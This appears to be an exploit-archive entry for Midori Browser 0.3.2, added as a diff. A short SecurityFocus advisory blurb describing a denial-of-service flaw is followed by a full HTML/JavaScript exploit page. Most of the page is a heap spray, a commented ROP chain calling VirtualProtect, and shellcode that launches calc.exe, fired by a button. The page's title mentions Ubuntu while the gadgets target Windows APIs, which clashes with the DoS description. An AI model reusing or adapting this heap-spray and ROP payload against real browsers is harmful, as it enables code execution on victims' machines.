@@ -1,0 +1,132 @@
+source: http://www.securityfocus.com/bid/55709/info
+
+The Midori Browser is prone to a denial-of-service vulnerability.
+
+An attacker can exploit this issue to crash the affected application, denying service to legitimate users.
+
+Midori Browser 0.3.2 is vulnerable; other versions may also be affected. 
+
+
+it****************************
+
+<html>
+<!-- ROP completed--->
+<head>
+<Title>Ubuntu 11.10 Calc p47l0d -- Rop Completed</title>
+<script type="text/javascript">
+function ignite()    {
+    var carpet = 0x200;
+    var vftable = unescape("\x00% u0c10");
+    var pLand = "% u00fd% u0c10";
+    var pShell = "% u0000% u0c10";
+    var oldProt = "% u0000% u0c10";
+    
+    var heap = unescape("% u0101% u0102"
+                    +"% u0008% u0c10"
+                    +"% u0105% u0106"
+                    +"% u10c2% u7c34"//"% u0107% u0108" pop ecx;pop ecx;ret
+                    +"% u0109% u010a"//
+                    +"% u3134% u6d32"//"% u010b% u010c"//"% u6643% u6d6a" // mov eax,[esi]
+                    +"% u787f% u6d32"//"% u010d% u010e"// xchg eax,esi;aam 0ff;dec ecx;ret
+                    +"% u7b72% u6d83"//"% u010f% u0111" // pop edx;ret
+                    +"% u0000% u0c10"//% u0112% u0113" // will be popped in edx //
+                    +"% u2a30% u6d7f"//"% u0114% u0115" // mov ecx,esi;call [edx+50]
+                    +pLand//"% u0116% u0117" // Address in shellcode to land change it accordingly
+                    +"% ue8d4% u6d7f"//"% u0118% u0119"    // mov [ecx],eax;pop ebp;ret
+                    +"% u011a% u011b"// will be popped in ebp
+                    +"% u1b02% u7c34"//"% u011c% u011d" // dec ecx;ret
+                    +"% u1b02% u7c34"//"% u011e% u011f" // dec ecx;ret
+                    +"% u1b02% u7c34"//"% u0120% u0121" // dec ecx;ret
+                    +"% u1b02% u7c34"//"% u0122% u0123" // dec ecx;ret
+                    +"% u4edc% u7c34"//"% u0122% u0123" // pop eax;ret
+                    +oldProt//"% u0124% u0125" // pOldProtection
+                    +"% ue8d4% u6d7f"//"% u0126% u0127" // mov [ecx],eax;pop ebp;ret
+                    +"% u4edb% u7c34"//"% u0128% u0129" // pop ebx;pop eax;ret // needed in initial phase.
+                    +"% u1b02% u7c34"//"% u012a% u012b" // dec ecx;ret
+                    +"% u1b02% u7c34"//"% u012c% u012d" // dec ecx;ret
+                    +"% u4edb% u7c34"//"% u012e% u012f" // pop ebx;pop eax;ret
+                    +"% u2643% u7c34"//"% u0130% u0131" // xchg eax,esp;pop edi;add byte ptr ds:[eax],al;pop ecx,ret
+                    +"% u0040% u0000"//"% u0132% u0133" // newProptection = PAGE_READ_WRITE_EXECUTE
+                    +"% u1b02% u7c34"//"% u0134% u0135" // dec ecx;ret
+                    +"% u1b02% u7c34"//"% u0136% u0137" // dec ecx;ret
+                    +"% ue8d4% u6d7f"//"% u0138% u0139" // mov [ecx],eax;pop ebp;ret
+                    +"% u013a% u013b"// will be popped in ebp
+                    +"% u1b02% u7c34"//"% u013c% u013d" // dec ecx;ret
+                    +"% u1b02% u7c34"//"% u013e% u013f" // dec ecx;ret
+                    +"% u1b02% u7c34"//"% u0140% u0141" // dec ecx;ret
+                    +"% u1b02% u7c34"//"% u0142% u0143" // dec ecx;ret
+                    
+                    +"% u4edc% u7c34"//"% u0144% u0145" // pop eax;ret
+                    +"% u0000% u0010"//"% u0146% u0147" // Size
+                    +"% ue8d4% u6d7f"//"% u0148% u0149" // mov [ecx],eax;pop ebp;ret
+                    +"% u014a% u014b"// Will be popped in ebp.
+                    +"% u1b02% u7c34"//"% u014c% u014d" // dec ecx;ret
+                    +"% u1b02% u7c34"//"% u014e% u014f" // dec ecx;ret
+                    +"% u1b02% u7c34"//"% u0150% u0151" // dec ecx;ret
+                    +"% u1b02% u7c34"//"% u0152% u0153" // dec ecx;ret
+                    
+                    +"% u4edc% u7c34"//"% u0144% u0145" // pop eax;ret
+                    +pShell//"% u0146% u0147" // Address Of Shellcode block to change protection.
+                    +"% ue8d4% u6d7f"//"% u0148% u0149" // mov [ecx],eax;pop ebp;ret
+                    +"% u014a% u014b"// Will be popped in ebp.
+/*                    +"% u1b02% u7c34"//"% u014c% u014d" // dec ecx;ret
+                    +"% u1b02% u7c34"//"% u014e% u014f" // dec ecx;ret
+                    +"% u1b02% u7c34"//"% u0150% u0151" // dec ecx;ret
+                    +"% u1b02% u7c34"//"% u0152% u0153" // dec ecx;ret
+*/                    +"% u4cc1% u7c34"//"% u0154% u0155" // pop eax;ret
+                    +"% u9611% u7c34"//"% u0156% u0157" // will be popped in eax. pop edi;pop ebx;pop ebp;ret
+                    +"% u347a% u7c34"//"% u0158% u0159" // push esi;push edi;call eax
+                    +"% u4edc% u7c34"//"% u015a% u015b" // pop eax;ret
+                    +"% u00e0% u0c10"//"% u015c% u015d" // will be popped in eax.
+                    
+                    /* Need to fix the ebp for proper landing on shellcode */
+                    +"% uc420% u6d99"// dec ebp;ret
+                    +"% uc420% u6d99"// dec ebp;ret
+                    +"% uc420% u6d99"// dec ebp;ret
+                    +"% uc420% u6d99"// dec ebp;ret
+                    
+                    
+                    +"% u1f0a% u7c34"//"% u015e% u015f" // mov esp,ecx;mov ecx[eax];mov eax,[eax+4];push eax;ret
+                    +"% u0160% u0161"
+                    +"% u28dd% u7c35"//"% u0162% u0163" // VirtualProtect
+                    +"% u0164% u0165"
+                    +"% u0166% u0167"
+                    +"% u0168% u0169"
+                    +"% u016a% u016b"
+                    +"% u016c% u016d"
+                    )
+/* Shellcode : */    +unescape("% u9090% u9090% u9090% u9090"
+                    +"% u585b" // pop ebx;pop eax;
+                    +"% u0a05% u0a13% u9000" // add eax,0a130a
+                    +"% u008b" // mov eax,[eax]
+                    +"% u056a" // push 05
+                    +"% uc581% u0128% u0000" // add ebp,114
+                    +"% u9055" // push ebp;nop
+                    +"% u1505% u04d6% u9000" // add eax,4d615
+                    +"% ud0ff" // call eax
+                    +"% uBBBB% uCCCC% uDDDD% uEEEE"
+/* command: */        +"% u6163% u636c% u652e% u6578% u0000% ucccc"    // calc.exe
+                    );
+        var vtable = unescape("\x04% u0c10");
+        while(vtable.length < 0x10000) {vtable += vtable;}
+        var heapblock = heap+vtable.substring(0,0x10000/2-heap.length*2);
+        while (heapblock.length<0x80000) {heapblock += heap+heapblock;}
+        var finalspray = heapblock.substring(0,0x80000 - heap.length - 0x24/2 - 0x4/2 - 0x2/2);
+        var spray = new Array();
+        for (var iter=0;iter<carpet;iter++){
+            spray[iter] = finalspray+heap;
+        }
+/* vulnerability trigger : */        
+        var arrobject = [0x444444444444];
+        for(;true;){(arrobject[0])++;}
+}
+</script>
+</head>
+<body>
+<applet src="test.class" width=10 height=10></applet>
+<input type=button value="Object++" onclick="ignite()" />
+</body>
+</html>
+
+********************Exploit****************************
+
